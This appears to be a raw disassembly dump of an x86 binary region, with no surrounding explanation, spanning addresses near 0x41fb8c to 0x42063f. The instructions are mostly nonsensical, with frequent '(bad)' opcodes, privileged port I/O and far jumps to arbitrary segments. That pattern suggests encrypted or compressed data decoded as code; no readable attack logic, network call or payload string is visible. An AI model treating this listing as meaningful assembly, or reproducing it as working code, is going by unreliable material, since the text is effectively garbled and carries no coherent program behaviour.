  41fb8c:	push   ebx
  41fb8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb8e:	push   edx
  41fb8f:	dec    edi
  41fb90:	jg     0x41fb2a
  41fb92:	lods   eax,DWORD PTR ds:[esi]
  41fb93:	clc    
  41fb94:	xor    bl,dl
  41fb96:	in     al,dx
  41fb97:	les    edi,FWORD PTR [esi+eax*4+0x7cde5a98]
  41fb9e:	ss jecxz 0x41fc0b
  41fba1:	fbld   TBYTE PTR [ebp-0x5613fb97]
  41fba7:	fidivr DWORD PTR [esi+0x59]
  41fbaa:	iret   
  41fbab:	clc    
  41fbac:	sahf   
  41fbad:	cld    
  41fbae:	jle    0x41fb3b
  41fbb0:	stos   DWORD PTR es:[edi],eax
  41fbb1:	into   
  41fbb2:	test   esp,esi
  41fbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbb5:	fwait
  41fbb6:	and    esp,0x14be3db9
  41fbbc:	pop    ecx
  41fbbd:	lea    edx,[edi-0x29]
  41fbc0:	pop    edi
  41fbc1:	add    eax,0x0
	...
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	inc    ecx
  41fc35:	icebp  
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xde548ad2
  41fc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc43:	enter  0x5504,0x1
  41fc47:	add    dh,dh
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [edx],bh
  41fc4d:	arpl   bx,di
  41fc4f:	imul   DWORD PTR [ebx-0x7b]
  41fc52:	sbb    BYTE PTR [esi+0x1a],dh
  41fc55:	pop    ss
  41fc56:	adc    BYTE PTR [eax],ch
  41fc58:	inc    ebp
  41fc59:	and    bl,ch
  41fc5b:	dec    esp
  41fc5c:	int    0xe6
  41fc5e:	fadd   DWORD PTR [eax-0x434851a9]
  41fc64:	or     BYTE PTR [ecx],bh
  41fc66:	xor    BYTE PTR [ebp-0x4f],cl
  41fc69:	fs jns 0x41fccf
  41fc6c:	xor    ebx,DWORD PTR [edi]
  41fc6e:	sbb    dh,0x4e
  41fc71:	int    0x75
  41fc73:	push   ss
  41fc74:	fs in  al,dx
  41fc76:	int3   
  41fc77:	cmp    eax,0x6ba8ac0c
  41fc7c:	cmc    
  41fc7d:	cwde   
  41fc7e:	outs   dx,BYTE PTR ds:[esi]
  41fc7f:	push   ds
  41fc80:	or     eax,0x4bbfd084
  41fc85:	leave  
  41fc86:	cld    
  41fc87:	mov    bl,BYTE PTR [edi+0x2b]
  41fc8a:	in     al,dx
  41fc8b:	mov    eax,ds:0x2f4e9877
  41fc90:	scas   al,BYTE PTR es:[edi]
  41fc91:	scas   al,BYTE PTR es:[edi]
  41fc92:	mov    ch,0x28
  41fc94:	inc    esi
  41fc95:	ror    BYTE PTR [eax+0x35846103],0xfb
  41fc9c:	dec    esp
  41fc9d:	sbb    edi,0xffffff9c
  41fca0:	(bad)  
  41fca1:	(bad)  
  41fca2:	out    0x55,al
  41fca4:	jmp    0xb270:0x64d0a85e
  41fcab:	xchg   ebp,eax
  41fcac:	mov    edx,0x1454d222
  41fcb1:	outs   dx,BYTE PTR ds:[esi]
  41fcb2:	push   ebp
  41fcb3:	xchg   edx,eax
  41fcb4:	jmp    0x7073:0xc2ec5683
  41fcbb:	retf   0x96ce
  41fcbe:	out    0xe7,al
  41fcc0:	jmp    0x7359:0xd4292f37
  41fcc7:	jge    0x41fcfc
  41fcc9:	dec    esp
  41fcca:	loope  0x41fc7d
  41fccc:	fild   QWORD PTR [ecx]
  41fcce:	std    
  41fccf:	push   ds
  41fcd0:	and    al,0x6f
  41fcd2:	pop    ebx
  41fcd3:	jne    0x41fd48
  41fcd5:	call   0x2deb:0x369fbd9b
  41fcdc:	(bad)  
  41fcdd:	pop    ebx
  41fcde:	icebp  
  41fcdf:	ins    BYTE PTR es:[edi],dx
  41fce0:	shr    esp,0xeb
  41fce3:	out    0x55,eax
  41fce5:	xchg   DWORD PTR [ebx+0x39b3ef42],ecx
  41fceb:	out    0xa8,al
  41fced:	call   0x339c:0xe8e3b323
  41fcf4:	scas   eax,DWORD PTR es:[edi]
  41fcf5:	jbe    0x41fcd7
  41fcf7:	lahf   
  41fcf8:	dec    edi
  41fcf9:	call   0x7615:0xa8e157cc
  41fd00:	test   al,0x92
  41fd02:	and    eax,0xed68ed78
  41fd07:	repz in al,dx
  41fd09:	pop    ebx
  41fd0a:	pop    ecx
  41fd0b:	sbb    ah,BYTE PTR [edx-0x5cf4324d]
  41fd11:	or     al,0xc1
  41fd13:	add    BYTE PTR [esi],ch
  41fd15:	in     al,0x73
  41fd17:	in     eax,0x24
  41fd19:	mov    ds:0x3ef432a0,al
  41fd1e:	push   cs
  41fd1f:	cmp    eax,0xecc99f1
  41fd24:	sti    
  41fd25:	repz popa 
  41fd27:	div    DWORD PTR [ecx+0x793eb9e]
  41fd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd2e:	and    eax,0x6804ee5a
  41fd33:	cli    
  41fd34:	dec    ebp
  41fd35:	ficom  DWORD PTR ss:[ebx+esi*1-0x40]
  41fd3a:	sbb    esp,esi
  41fd3c:	dec    eax
  41fd3d:	and    DWORD PTR [edi],ebp
  41fd3f:	cmp    BYTE PTR [eax+0x6e],bh
	...
  41fdb1:	add    BYTE PTR [eax],al
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	inc    edx
  41fdc1:	pushf  
  41fdc2:	dec    edx
  41fdc3:	ja     0x41fdbf
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    ch,cl
  41fdcd:	test   al,0xb7
  41fdcf:	(bad)  
  41fdd0:	in     eax,dx
  41fdd1:	out    dx,eax
  41fdd2:	gs pop ds
  41fdd4:	data16 (bad) 
  41fdd6:	call   0x35504c20
  41fddb:	pushf  
  41fddc:	pop    ds
  41fddd:	loope  0x41fdc2
  41fddf:	outs   dx,BYTE PTR ds:[esi]
  41fde0:	cmp    ebx,DWORD PTR [ebx+0x14f86371]
  41fde6:	cmp    bl,ah
  41fde8:	fsub   QWORD PTR [ecx+0x1cce6145]
  41fdee:	idiv   BYTE PTR [ecx+0x48]
  41fdf1:	pop    esi
  41fdf2:	sti    
  41fdf3:	push   es
  41fdf4:	and    al,0x2c
  41fdf6:	pop    esp
  41fdf7:	ins    BYTE PTR es:[edi],dx
  41fdf8:	sub    al,0xc4
  41fdfa:	mov    edx,0xbb83bae4
  41fdff:	and    DWORD PTR [esi+eiz*8],edi
  41fe02:	add    BYTE PTR [ebp-0x2c9e896f],bl
  41fe08:	cmp    ah,BYTE PTR [ebx]
  41fe0a:	cmp    ebp,DWORD PTR [edx+0x763ebb13]
  41fe10:	ja     0x41fe42
  41fe12:	test   BYTE PTR [esi-0x6d2f1f51],bh
  41fe18:	(bad)  
  41fe19:	imul   esp
  41fe1b:	cmp    bh,0xbd
  41fe1e:	adc    BYTE PTR es:[esi-0x26],bl
  41fe22:	int3   
  41fe23:	add    ch,bl
  41fe25:	xchg   ecx,eax
  41fe26:	mov    WORD PTR [edx],ss
  41fe28:	push   ecx
  41fe29:	push   es
  41fe2a:	add    DWORD PTR [esp+edx*4],0xffffffb1
  41fe2e:	mov    ah,0x6c
  41fe30:	(bad)  
  41fe31:	cld    
  41fe32:	sahf   
  41fe33:	push   ss
  41fe34:	cli    
  41fe35:	adc    al,0xaf
  41fe37:	into   
  41fe38:	push   esi
  41fe39:	or     eax,0xf668a29a
  41fe3e:	xchg   DWORD PTR [esi],ebp
  41fe40:	xchg   ebx,eax
  41fe41:	clc    
  41fe42:	dec    edx
  41fe43:	sbb    DWORD PTR [ebx+ebp*1+0x84a93ba],0xffffff92
  41fe4b:	pushf  
  41fe4c:	and    edi,DWORD PTR [esi]
  41fe4e:	mov    ch,0xe6
  41fe50:	in     eax,dx
  41fe51:	or     al,0xbf
  41fe53:	nop
  41fe54:	stos   BYTE PTR es:[edi],al
  41fe55:	sbb    DWORD PTR [ebp+0x38],ecx
  41fe58:	inc    edx
  41fe59:	mov    ch,BYTE PTR ds:0x5e9992e5
  41fe5f:	push   ds
  41fe60:	fcomp  QWORD PTR [edx]
  41fe62:	xor    DWORD PTR ds:0x144d5814,eax
  41fe68:	dec    ebp
  41fe69:	pop    es
  41fe6a:	test   al,0x88
  41fe6c:	jmp    0x2179:0x12542265
  41fe73:	fisttp WORD PTR [edi-0x2b]
  41fe76:	sub    esi,DWORD PTR [edi+0x5d96fad3]
  41fe7c:	xchg   esi,eax
  41fe7d:	push   eax
  41fe7e:	aad    0x3f
  41fe80:	push   edi
  41fe81:	loope  0x41fecf
  41fe83:	push   ebp
  41fe84:	bnd je 0x41fed5
  41fe87:	or     eax,DWORD PTR [eax+0x1b4b589d]
  41fe8d:	sbb    eax,0xaeaa0fbc
  41fe92:	test   DWORD PTR [ecx],0xe054272
  41fe98:	cwde   
  41fe99:	mov    WORD PTR [edx],gs
  41fe9b:	scas   al,BYTE PTR es:[edi]
  41fe9c:	scas   al,BYTE PTR es:[edi]
  41fe9d:	ja     0x41fed5
  41fe9f:	sti    
  41fea0:	setns  BYTE PTR [edx-0x46]
  41fea4:	enter  0xd226,0x3c
  41fea8:	cmp    eax,ebp
  41feaa:	mov    BYTE PTR [eax-0xe6d810d],dh
  41feb0:	je     0x41ff06
  41feb2:	std    
  41feb3:	mov    bh,al
  41feb5:	sti    
  41feb6:	mov    al,0x4b
  41feb8:	sbb    cl,BYTE PTR [edi-0x2]
  41febb:	mov    bh,0xeb
  41febd:	mov    BYTE PTR [ecx-0x75],bl
  41fec0:	imul   ebx,DWORD PTR [edx+0x0],0x0
	...
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x63fc868a],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [ecx+0x73],ah
  41ff4e:	dec    eax
  41ff4f:	leave  
  41ff50:	enter  0x406f,0x44
  41ff54:	pusha  
  41ff55:	cs mov edi,0x42f429c2
  41ff5b:	add    eax,0x5c1a2838
  41ff60:	scas   al,BYTE PTR es:[edi]
  41ff61:	push   ss
  41ff62:	rcr    BYTE PTR [esi-0xb502ccb],0x3f
  41ff69:	mov    al,0x93
  41ff6b:	dec    ebx
  41ff6c:	cdq    
  41ff6d:	xor    eax,0xd8640133
  41ff72:	stos   BYTE PTR es:[edi],al
  41ff73:	adc    al,0x8e
  41ff75:	pop    esi
  41ff76:	lock je 0x41fff4
  41ff79:	pop    ss
  41ff7a:	cs js  0x41ff2d
  41ff7d:	imul   eax,DWORD PTR [ebp*1+0x4e27a883],0xffffff92
  41ff85:	imul   edi,DWORD PTR [esi-0x5],0xe8868a59
  41ff8c:	sti    
  41ff8d:	mov    dh,BYTE PTR ds:0x57b0978a
  41ff93:	pop    ecx
  41ff94:	call   0xdb07:0x2a4d4c63
  41ff9b:	pop    ss
  41ff9c:	pop    esi
  41ff9d:	or     eax,0xde0c385b
  41ffa2:	xor    ecx,DWORD PTR [ebx+0x70b0c9dc]
  41ffa8:	pop    es
  41ffa9:	call   0xf790:0x6106d517
  41ffb0:	sbb    ebp,DWORD PTR [ebp+0x20]
  41ffb3:	add    DWORD PTR [edx+eiz*8+0x3d],ebp
  41ffb7:	mov    dh,BYTE PTR [ebp+0x2566a984]
  41ffbd:	aad    0x3e
  41ffbf:	fsub   QWORD PTR [edi+ebx*2-0xc]
  41ffc3:	jae    0x41ffc3
  41ffc5:	loope  0x41ff53
  41ffc7:	push   ebx
  41ffc8:	fst    DWORD PTR [edi-0x496c895d]
  41ffce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffcf:	aaa    
  41ffd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffd1:	push   ebp
  41ffd2:	and    edx,DWORD PTR [ecx+0x5bbfb9a]
  41ffd8:	in     eax,0x95
  41ffda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffdb:	and    DWORD PTR [ecx-0x78c561cb],edx
  41ffe1:	sub    al,BYTE PTR [eax]
  41ffe3:	cmp    ebp,ecx
  41ffe5:	retf   
  41ffe6:	sti    
  41ffe7:	sub    al,0xe7
  41ffe9:	xchg   ebp,eax
  41ffea:	add    BYTE PTR [ecx],cl
  41ffec:	jmp    0x295512e2
  41fff1:	les    ebx,FWORD PTR [edx+0x64]
  41fff4:	xlat   BYTE PTR ds:[ebx]
  41fff5:	jmp    0xc69f667a
  41fffa:	mov    ds:0x6e44b5be,al
  41ffff:	or     al,0xa5
  420001:	aad    0x9c
  420003:	jnp    0x420005
  420005:	fcomp  QWORD PTR [ebp+0x2855c971]
  42000b:	fcom   QWORD PTR [ecx]
  42000d:	or     eax,DWORD PTR [ebp-0x69]
  420010:	inc    ebx
  420011:	(bad)  
  420012:	sub    al,0xc7
  420014:	push   0x8b7287df
  420019:	mov    edx,0x5388f712
  42001e:	jecxz  0x41ffed
  420020:	xchg   esi,eax
  420021:	adc    al,0x16
  420023:	xchg   ebp,eax
  420024:	mov    eax,ds:0x139af157
  42002a:	test   esp,eax
  42002c:	sahf   
  42002d:	repz sbb edi,ecx
  420030:	(bad)  
  420031:	jecxz  0x41ffc9
  420033:	in     al,0x7d
  420035:	fnsave [esi-0x6c]
  420038:	cmp    al,0x60
  42003a:	call   0x28361647
  42003f:	loope  0x42003d
  420041:	jnp    0x420043
	...
  4200b3:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x2b2c13c0],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    BYTE PTR [ebx],ch
  4200cd:	adc    al,0x86
  4200cf:	jl     0x420140
  4200d1:	outs   dx,BYTE PTR ds:[esi]
  4200d2:	lock jbe 0x420146
  4200d5:	shl    esi,0x3c
  4200d8:	dec    ecx
  4200d9:	jae    0x420120
  4200db:	(bad)  
  4200dc:	mov    al,ds:0xdd8e3723
  4200e1:	or     BYTE PTR [eax+ecx*4],cl
  4200e4:	icebp  
  4200e5:	push   ecx
  4200e6:	fisubr DWORD PTR ds:0x7f30a47e
  4200ec:	jae    0x420150
  4200ee:	stos   DWORD PTR es:[edi],eax
  4200ef:	imul   al
  4200f1:	into   
  4200f2:	and    al,0x3d
  4200f4:	lea    ecx,[edx-0x52b3b1dc]
  4200fa:	ficomp DWORD PTR [edi-0x5cbb72]
  420100:	adc    BYTE PTR [esi],dl
  420102:	fmul   DWORD PTR [ebx]
  420104:	mov    dl,0xa
  420106:	dec    ecx
  420107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420108:	arpl   WORD PTR [edi-0x23],dx
  42010b:	add    BYTE PTR [ebp+edi*8-0x5a],bl
  42010f:	jl     0x4200a0
  420111:	dec    edi
  420112:	popf   
  420113:	xor    DWORD PTR [edi],esp
  420115:	je     0x420103
  420117:	out    0x8,eax
  420119:	xor    DWORD PTR [edi],edi
  42011b:	imul   ebp,esp,0x6e6d07f2
  420121:	jne    0x420150
  420123:	xor    BYTE PTR [esi*2-0x537d11a0],ah
  42012a:	out    0x6e,eax
  42012c:	shr    BYTE PTR [ebx+ecx*1+0x45d89efd],0xcb
  420134:	das    
  420135:	imul   DWORD PTR [edi+0x8]
  420138:	call   0xc486:0x7b3be6e2
  42013f:	dec    esp
  420140:	sahf   
  420141:	in     eax,dx
  420142:	jae    0x4200d7
  420144:	push   0x22
  420146:	fisub  WORD PTR [esi+0x2a38245b]
  42014c:	inc    ecx
  42014d:	fist   DWORD PTR [ebp+0x4b12a90c]
  420153:	cli    
  420154:	fild   DWORD PTR [ecx-0x37]
  420157:	mov    BYTE PTR [ebx-0x27725559],al
  42015d:	and    ebx,esi
  42015f:	inc    ebp
  420160:	addr16 mov ah,0xa5
  420163:	jnp    0x420125
  420165:	add    al,0x68
  420167:	scas   al,BYTE PTR es:[edi]
  420168:	xchg   DWORD PTR [edx+0x28],esi
  42016b:	or     al,0x2a
  42016d:	int    0x9b
  42016f:	cdq    
  420170:	cmp    eax,0x36d1506d
  420175:	jge    0x42019b
  420177:	or     ah,0x9c
  42017a:	inc    ecx
  42017b:	es cmp eax,0x3058ece5
  420181:	push   esi
  420182:	inc    edx
  420183:	jbe    0x42013b
  420185:	mov    bl,0x73
  420187:	test   al,0x51
  420189:	push   edi
  42018a:	ds jns 0x4201c0
  42018d:	push   esp
  42018e:	sahf   
  42018f:	arpl   WORD PTR [ebx-0x562ab0b9],ax
  420195:	or     ecx,DWORD PTR [ebx-0x52036b62]
  42019b:	mov    DWORD PTR [ebp+0x5a],ebx
  42019e:	clc    
  42019f:	leave  
  4201a0:	jl     0x420182
  4201a2:	cwde   
  4201a3:	popa   
  4201a4:	fs push es
  4201a6:	sbb    BYTE PTR [edx-0x4f],ah
  4201a9:	in     al,0xd
  4201ab:	icebp  
  4201ac:	inc    ebx
  4201ad:	jle    0x420218
  4201af:	mov    cl,0xd7
  4201b1:	lea    ebx,[edx+0x60]
  4201b4:	les    ecx,FWORD PTR [edi+0x5445a827]
  4201ba:	pop    ecx
  4201bb:	shr    BYTE PTR [edi],0x3e
  4201be:	jae    0x420161
  4201c0:	mov    ebx,0xaf
	...
  420231:	add    BYTE PTR [eax],al
  420233:	add    BYTE PTR [ecx+0x1b],dl
  420236:	jmp    DWORD PTR [esi-0x1]
  420239:	out    0xd9,al
  42023b:	aas    
  42023c:	mov    DWORD PTR ds:0x7e42d010,ebx
  420242:	mov    edi,0x158dc73
  420247:	add    dh,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    ch,bl
  42024d:	cmc    
  42024e:	xchg   esp,eax
  42024f:	fcmovnb st,st(4)
  420251:	ins    DWORD PTR es:[edi],dx
  420252:	or     DWORD PTR [ebx],esp
  420254:	arpl   WORD PTR [eax+0x1d207a44],si
  42025a:	ss pushf 
  42025c:	cmc    
  42025d:	sub    al,0x27
  42025f:	aam    0xc6
  420261:	lea    edx,[edx-0x71]
  420264:	aam    0x74
  420266:	test   BYTE PTR [esi-0x793f97f1],0x7a
  42026d:	ret    
  42026e:	fcmovu st,st(4)
  420270:	and    bl,cl
  420272:	cwde   
  420273:	je     0x42027a
  420275:	jmp    0x635b:0x857a89fc
  42027c:	cmp    DWORD PTR ss:[ebx+0x374c0a20],ecx
  420283:	adc    al,0x73
  420285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420286:	(bad)  
  420287:	ficomp WORD PTR [ebp+eax*2-0x3281af6d]
  42028e:	mov    dh,BYTE PTR [esi]
  420290:	push   ds
  420291:	xor    eax,0xffffff82
  420294:	ins    DWORD PTR es:[edi],dx
  420295:	pop    ebp
  420296:	or     eax,0xd8b7060b
  42029b:	ja     0x4202b5
  42029d:	or     eax,0x8f0d7b11
  4202a2:	dec    esp
  4202a3:	das    
  4202a4:	add    eax,0xcafe5977
  4202a9:	mov    dh,0x31
  4202ab:	scas   eax,DWORD PTR es:[edi]
  4202ac:	pop    esp
  4202ad:	adc    al,BYTE PTR [eax-0x31]
  4202b0:	fisubr WORD PTR [edx+0x43dad4d1]
  4202b6:	ja     0x420254
  4202b8:	mov    dl,0xa4
  4202ba:	sub    eax,0x4c237463
  4202bf:	sub    al,0xac
  4202c1:	out    dx,eax
  4202c2:	dec    ecx
  4202c3:	je     0x420288
  4202c5:	(bad)  
  4202c6:	retf   
  4202c7:	and    cl,al
  4202c9:	jb     0x420274
  4202cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202cc:	push   cs
  4202cd:	jmp    0x720b84df
  4202d2:	mov    eax,ds:0x24b5b1c0
  4202d7:	mov    ebx,0xff6cd786
  4202dc:	jnp    0x420328
  4202de:	in     al,0xf9
  4202e0:	outs   dx,BYTE PTR ds:[esi]
  4202e1:	das    
  4202e2:	xor    al,0x9a
  4202e4:	jmp    0x6b7989f3
  4202e9:	fs test al,0xe7
  4202ec:	mov    ecx,0x56e7713c
  4202f1:	cli    
  4202f2:	enter  0xc464,0x3b
  4202f6:	(bad)  
  4202f7:	pop    edi
  4202f8:	xchg   esi,eax
  4202f9:	aas    
  4202fa:	inc    eax
  4202fb:	gs fsubr st(1),st
  4202fe:	dec    esp
  4202ff:	mov    ebx,0x19eb307
  420304:	fsubr  QWORD PTR [esi+0x31]
  420307:	push   ds
  420308:	xor    BYTE PTR [ecx],0x3e
  42030b:	(bad)  [ecx+ebx*2-0x7aa7fc9f]
  420312:	jp     0x420355
  420314:	fldenv [ecx+ecx*8+0x5749c4ec]
  42031b:	jl     0x4202f2
  42031d:	sbb    DWORD PTR [ecx],edx
  42031f:	popa   
  420320:	mov    DWORD PTR [edx-0x2927cd35],esi
  420326:	inc    edi
  420327:	push   esp
  420328:	mov    bh,0xbb
  42032a:	or     DWORD PTR [edx+ebx*2-0x35adfa64],ebx
  420331:	or     DWORD PTR [esi-0x4493b3b7],ebp
  420337:	cmp    al,0xf6
  420339:	xchg   eax,edi
  42033b:	stos   DWORD PTR es:[edi],eax
  42033c:	sub    eax,0x7c49c519
  420341:	loope  0x420343
	...
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR ds:0xd2ca7880,sp
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	test   BYTE PTR [eax],0x0
  4203cb:	add    bl,ch
  4203cd:	(bad)  
  4203ce:	cld    
  4203cf:	sbb    BYTE PTR [ebx+eax*4-0x6c],0xe7
  4203d4:	test   al,0xc9
  4203d6:	jge    0x4203e8
  4203d8:	ja     0x420417
  4203da:	xchg   edx,eax
  4203db:	jmp    0x832a:0x8ca01312
  4203e2:	aas    
  4203e3:	clc    
  4203e4:	sub    eax,0xfa6a24a5
  4203e9:	repnz xor eax,0x65d79003
  4203ef:	sub    bh,BYTE PTR [eax]
  4203f1:	in     al,0x19
  4203f3:	push   ss
  4203f4:	xchg   ecx,eax
  4203f5:	ror    DWORD PTR [eax+edx*2],1
  4203f8:	dec    edi
  4203f9:	outs   dx,DWORD PTR ds:[esi]
  4203fa:	div    BYTE PTR [ebp-0x1e]
  4203fd:	(bad)  
  4203fe:	dec    ebp
  4203ff:	lahf   
  420400:	or     esi,ebx
  420402:	sub    al,0xb9
  420404:	das    
  420405:	xor    ch,BYTE PTR [edi]
  420407:	mov    BYTE PTR [edi],al
  420409:	sbb    DWORD PTR [ecx-0x54391f1f],edi
  42040f:	mov    cs,esi
  420411:	aas    
  420412:	inc    ebx
  420413:	idiv   BYTE PTR [ecx]
  420415:	in     al,0xb0
  420417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420418:	or     al,0x7d
  42041a:	xor    ebp,DWORD PTR [edi+ecx*1-0x57]
  42041e:	in     al,0x49
  420420:	inc    edx
  420421:	enter  0x36a6,0x59
  420425:	cmp    dl,BYTE PTR [edx+0x6844642e]
  42042b:	mov    cl,BYTE PTR [ebx]
  42042d:	test   al,0x3f
  42042f:	pop    es
  420430:	out    dx,al
  420431:	mov    DWORD PTR [ebx+0x57],eax
  420434:	dec    ebp
  420435:	mov    edx,DWORD PTR [edi-0x3c54c792]
  42043b:	pop    edi
  42043c:	mov    bl,0x62
  42043e:	das    
  42043f:	cld    
  420440:	aas    
  420441:	data16 in al,dx
  420443:	mov    edx,0xf2925990
  420448:	sub    eax,0xb699c331
  42044d:	push   esi
  42044e:	test   DWORD PTR [edi+0x28240046],ebx
  420454:	repz cwde 
  420456:	push   edx
  420457:	push   ebx
  420458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420459:	jo     0x42040a
  42045b:	inc    esi
  42045c:	retf   
  42045d:	mov    eax,0xdfb135aa
  420462:	push   ecx
  420463:	nop
  420464:	call   0x377d4eb8
  420469:	call   0xf158:0xeddc3b81
  420470:	test   al,0xc5
  420472:	int    0x24
  420474:	mov    edx,0xe6febff
  420479:	and    bl,cl
  42047b:	inc    eax
  42047c:	fs adc al,0x26
  42047f:	out    0x62,al
  420481:	sub    DWORD PTR [ebp-0x3fbc131e],esi
  420487:	inc    ebp
  420488:	shr    DWORD PTR [esi+edi*8-0x6642dc8],cl
  42048f:	fs nop
  420491:	mov    ds:0x2c9480b4,al
  420496:	pushf  
  420497:	cmp    BYTE PTR [eax+edx*4-0x178d02a1],0x1
  42049f:	lahf   
  4204a0:	xchg   ebp,eax
  4204a1:	adc    ecx,ebx
  4204a3:	inc    ebp
  4204a4:	push   ds
  4204a5:	in     eax,dx
  4204a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a7:	or     al,0xf8
  4204a9:	in     al,dx
  4204aa:	int3   
  4204ab:	daa    
  4204ac:	jmp    FWORD PTR [ebx]
  4204ae:	push   eax
  4204af:	and    al,0x48
  4204b2:	fist   DWORD PTR [esi-0x5da7570b]
  4204b8:	cmp    DWORD PTR ds:[ebx],edx
  4204bb:	push   ds
  4204bc:	sub    esi,DWORD PTR [esi-0x4b128e71]
	...
  420532:	add    BYTE PTR [eax],al
  420534:	js     0x42056a
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	sub    DWORD PTR [ebx],esi
  420542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420543:	out    dx,al
  420544:	enter  0x15a,0x0
  420548:	test   BYTE PTR [eax],0x0
  42054b:	add    BYTE PTR [ecx],al
  42054d:	add    BYTE PTR [ebp+ebp*4+0x7d],bh
  420551:	xor    BYTE PTR [edi+0x38],al
  420554:	xchg   esp,eax
  420555:	jnp    0x420515
  420557:	das    
  420558:	jg     0x42051b
  42055a:	jo     0x4205ca
  42055c:	xchg   ebp,eax
  42055d:	and    dl,BYTE PTR [edx]
  42055f:	aas    
  420560:	inc    eax
  420561:	mov    ah,0xf3
  420563:	mov    DWORD PTR [edi+0x79d9e887],ebp
  420569:	rcl    bh,0x47
  42056c:	jecxz  0x4205e3
  42056e:	cmp    dl,BYTE PTR [edx-0x17d5df79]
  420574:	mov    cl,0x68
  420576:	and    ah,BYTE PTR [ecx-0x50]
  420579:	fadd   DWORD PTR cs:[edi+0x2e]
  42057d:	and    bh,BYTE PTR [edi-0x7b70c3c7]
  420583:	call   0x1a1d:0x866a077f
  42058a:	and    edi,DWORD PTR [edx]
  42058c:	mov    esp,0xb74f15ad
  420591:	add    al,0x62
  420593:	test   DWORD PTR [eax+0x19],0x829a48d7
  42059a:	sbb    eax,0x588d3407
  42059f:	jecxz  0x4205b1
  4205a1:	mov    dl,0xf1
  4205a3:	outs   dx,DWORD PTR ds:[esi]
  4205a4:	(bad)  
  4205a5:	xor    eax,ebp
  4205a7:	cs push ebp
  4205a9:	mov    eax,0x4338cc7a
  4205ae:	cdq    
  4205af:	pop    esp
  4205b0:	or     DWORD PTR [ecx-0x38],0xa309a4bc
  4205b7:	inc    eax
  4205b8:	test   eax,0x2f1ee253
  4205bd:	cmp    eax,0x67e79684
  4205c2:	ss pop es
  4205c4:	add    ch,BYTE PTR [edi]
  4205c6:	pop    ds
  4205c7:	nop
  4205c8:	fild   DWORD PTR gs:[eax]
  4205cb:	in     al,0xb6
  4205cd:	dec    DWORD PTR [ebx-0x76]
  4205d0:	mov    dh,0xf0
  4205d2:	stos   BYTE PTR es:[edi],al
  4205d3:	les    edi,FWORD PTR [esi-0x1b]
  4205d6:	and    al,0xb
  4205d8:	fwait
  4205d9:	and    al,0xec
  4205db:	icebp  
  4205dc:	inc    edi
  4205dd:	mov    ds:0x46129d69,al
  4205e2:	sti    
  4205e3:	jb     0x420635
  4205e5:	fisttp DWORD PTR [esp+ebp*1+0x31379a52]
  4205ec:	fbstp  TBYTE PTR [esi+edi*1+0x36]
  4205f0:	mov    es,WORD PTR [esi-0x25]
  4205f3:	int    0x11
  4205f5:	xor    al,ch
  4205f7:	mov    ebp,0x1f645988
  4205fc:	xchg   BYTE PTR [ebx+0xa0d8025],dl
  420602:	xchg   esp,eax
  420603:	jge    0x42066b
  420605:	fwait
  420606:	outs   dx,DWORD PTR ds:[esi]
  420607:	iret   
  420608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420609:	js     0x420653
  42060b:	gs (bad) 
  42060d:	icebp  
  42060e:	(bad)
  420611:	fldln2 
  420613:	pusha  
  420614:	mov    esi,0xca441154
  420619:	push   ebx
  42061a:	out    0x98,al
  42061c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42061d:	xor    ah,bl
  42061f:	jle    0x420638
  420621:	(bad)  
  420622:	out    dx,eax
  420623:	add    edi,esp
  420625:	out    0x72,al
  420627:	xor    cl,BYTE PTR [eax]
  420629:	sbb    eax,0x79f651fc
  42062e:	and    edi,DWORD PTR [edi+0x4dd76337]
  420634:	mov    edi,?
  420636:	add    BYTE PTR [eax-0x66],ah
  420639:	pop    ecx
  42063a:	(bad)  
  42063b:	sbb    al,0x65
  42063d:	mov    dh,0xa2
  42063f:	sub    ecx,DWORD PTR [edi-0x38]
	...
